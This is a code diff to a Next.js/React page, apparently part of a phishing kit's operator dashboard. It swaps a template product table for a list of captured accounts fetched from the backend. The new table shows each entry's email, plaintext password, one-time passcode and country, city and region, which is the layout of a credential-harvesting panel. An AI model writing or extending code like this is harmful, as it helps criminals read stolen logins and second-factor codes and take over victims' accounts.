@@ -1,10 +1,18 @@
 "use client";
 import Seo from "@/shared/layout-components/seo/seo";
 import Link from "next/link";
-import React, { Fragment } from "react";
+import React, { Fragment, useEffect } from "react";
 import { Button, Card, Col, Dropdown, Pagination, Row } from "react-bootstrap";
-
+import { getAccounts } from "@/shared/Api/dashboard";
+import { useDispatch, useSelector } from "react-redux";
 function CallLogsPage() {
+  const dispatch = useDispatch();
+  const user = useSelector((state: any) => state.auth.user);
+  const accounts = useSelector((state: any) => state.dash.accounts);
+  useEffect(() => {
+    console.log("accounts in here", accounts);
+    getAccounts(user?._id, dispatch);
+  }, []);
   const products = [
     {
       id: 1,
@@ -60,75 +68,62 @@ function CallLogsPage() {
                 <table className="table text-nowrap">
                   <thead>
                     <tr>
-                      <th scope="row" className="ps-4">
+                      {/* <th scope="row" className="ps-4">
                         <input
                           className="form-check-input"
                           type="checkbox"
                           aria-label="..."
                         />
-                      </th>
+                      </th> */}
                       <th>Email</th>
                       <th>Password</th>
                       <th>Otp</th>
                       <th>Browser</th>
                       <th>Country</th>
+                      <th>City</th>
                       <th>State</th>
-                      <th className="text-center">Total Sales</th>
-                      <th>Price</th>
-                      <th>Action</th>
+                      {/* <th>Action</th> */}
                     </tr>
                   </thead>
                   <tbody>
-                    {products.map((product) => (
-                      <tr key={product.id}>
-                        <td className="ps-4">
+                    {accounts.map((account: any) => (
+                      <tr key={account._id}>
+                        {/* <td className="ps-4">
                           <input
                             className="form-check-input"
                             type="checkbox"
                             aria-label="..."
                           />
-                        </td>
+                        </td> */}
                         <td>
                           <div className="d-flex">
-                            <span className="avatar avatar-md">
-                              <img
-                                src={product.imageUrl}
-                                alt={product.productName}
-                              />
-                            </span>
                             <div className="ms-2">
-                              <p className="fw-semibold fs-13 mb-0 d-flex align-items-center">
-                                <Link scroll={false} href="#!">
-                                  {product.productName}
-                                </Link>
-                              </p>
                               <p className="fs-12 text-muted mb-0">
-                                {product.brand}
+                                {account.email}
                               </p>
                             </div>
                           </div>
                         </td>
-                        <td>{product.category}</td>
+                        <td>{account.password}</td>
                         <td>
                           <span
-                            className={`badge bg-${product.status.toLowerCase()}-transparent`}
+                            className={`badge bg-${account?.status?.toLowerCase()}-transparent`}
                           >
-                            {product.status}
+                            {account.otp}
                           </span>
                         </td>
                         <td>
                           <span className="fw-semibold fs-13">
-                            {product.customerName}
+                            {"browser info"}
                           </span>
                           <span className="d-block text-muted fs-12">
-                            {product.customerEmail}
+                            {account?.location?.country}
                           </span>
                         </td>
-                        <td>{product.qty}</td>
-                        <td>{product.dateOrdered}</td>
-                        <td className="text-center">{product.totalSales}</td>
-                        <td className="fw-semibold">{product.price}</td>
-                        <td>
+                        <td>{account?.location?.country}</td>
+                        <td>{account?.location?.city}</td>
+                        <td>{account?.location?.region}</td>
+                        {/* <td>
                           <div className="btn-list">
                             <Button
                               variant=""
@@ -143,7 +138,7 @@ function CallLogsPage() {
                               <i className="ri-edit-line"></i>
                             </Button>
                           </div>
-                        </td>
+                        </td> */}
                       </tr>
                     ))}
                   </tbody>
